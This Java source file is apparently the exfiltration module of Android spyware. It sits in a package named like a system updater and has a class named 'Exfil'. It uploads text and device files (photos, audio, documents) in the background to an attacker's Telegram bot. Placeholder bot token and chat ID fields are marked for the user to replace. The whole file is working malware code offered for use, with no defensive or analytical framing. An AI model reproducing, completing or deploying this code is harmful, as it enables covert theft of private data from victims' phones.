package com.sys.updater;

import android.os.AsyncTask;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class Exfil {
    public static final String BOT_TOKEN = "HNA_TOKEN_DYALEK"; // <--- BEDEL
    public static final String CHAT_ID = "HNA_CHAT_ID_DYALEK"; // <--- BEDEL

    public static void send(String text) {
        new SendTextTask().execute(text);
    }
    
    public static void sendFile(String filePath, String type, String caption) {
        new SendFileTask(filePath, type, caption).execute();
    }

    private static class SendTextTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(params[0], "UTF-8");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                }
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
            return null;
        }
    }

    private static class SendFileTask extends AsyncTask<Void, Void, Void> {
        String path, type, caption;
        public SendFileTask(String path, String type, String caption) {
            this.path = path; this.type = type; this.caption = caption;
        }
        @Override
        protected Void doInBackground(Void... params) {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/send" + type;
                String boundary = "*****";
                File file = new File(path);
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                }
                String fieldName = type.equals("Photo") ? "photo" : (type.equals("Audio") ? "audio" : "document");
                dos.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fieldName + "\";filename=\"" + file.getName() + "\"\r\n\r\n");
                
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
                fis.close();
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush(); dos.close();
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
            return null;
        }
    }
}
